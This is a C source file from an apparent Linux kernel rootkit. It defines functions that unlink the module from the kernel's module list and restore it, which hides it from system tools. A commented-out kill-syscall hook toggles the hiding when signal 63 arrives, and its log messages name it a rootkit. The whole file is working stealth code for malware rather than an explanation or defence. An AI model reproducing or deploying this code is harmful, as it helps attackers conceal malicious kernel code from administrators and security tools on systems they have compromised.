//
// Created by sciver on 10/17/22.
//

#include "hide_module.h"
struct list_head *prev_module;
short hidden = 0;

void showme(void)
{
    /* Add the saved list_head struct back to the module list */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

void hideme(void)
{
    /* Save the module in the list before us, so we can add ourselves
     * back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
}
//asmlinkage long (*orig_kill_hide_module)(const struct pt_regs *);
//asmlinkage int hook_kill_hide_module(const struct pt_regs *regs)
//{
//    int sig = regs->si;
//
//    if ( (sig == 63) && (hidden == 0) )
//    {
//        printk(KERN_INFO "rootkit: hiding rootkit!\n");
//        hideme();
//        hidden = 1;
//    }
//    else if ( (sig == 63) && (hidden == 1) )
//    {
//        printk(KERN_INFO "rootkit: revealing rootkit!\n");
//        showme();
//        hidden = 0;
//    }
//    return orig_kill_hide_module(regs);
//}